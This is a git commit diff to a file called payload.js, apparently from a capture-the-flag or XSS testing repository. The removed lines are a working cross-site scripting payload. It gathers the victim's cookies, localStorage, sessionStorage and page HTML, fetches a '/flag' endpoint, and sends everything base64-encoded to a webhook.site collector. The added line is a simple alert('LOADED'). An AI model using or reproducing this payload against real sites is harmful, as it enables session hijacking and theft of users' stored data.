573f5afca2061019ed612152a3668ab6c6098a6e
t3igger <127245898+t3igger@users.noreply.github.com>
2026-03-16 14:16:30 +0100

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,18 +1,1 @@
-(async () => {
-
-let data = {
-    cookie: document.cookie,
-    localStorage: JSON.stringify(localStorage),
-    sessionStorage: JSON.stringify(sessionStorage),
-    html: document.documentElement.outerHTML
-};
-
-try {
-    let r = await fetch("/flag");
-    data.flag_endpoint = await r.text();
-} catch(e){}
-
-new Image().src =
-"https://webhook.site/4d8f3d85-deb0-4276-b244-661f50adb47f?data=" + btoa(JSON.stringify(data));
-
-})();
+alert("LOADED");
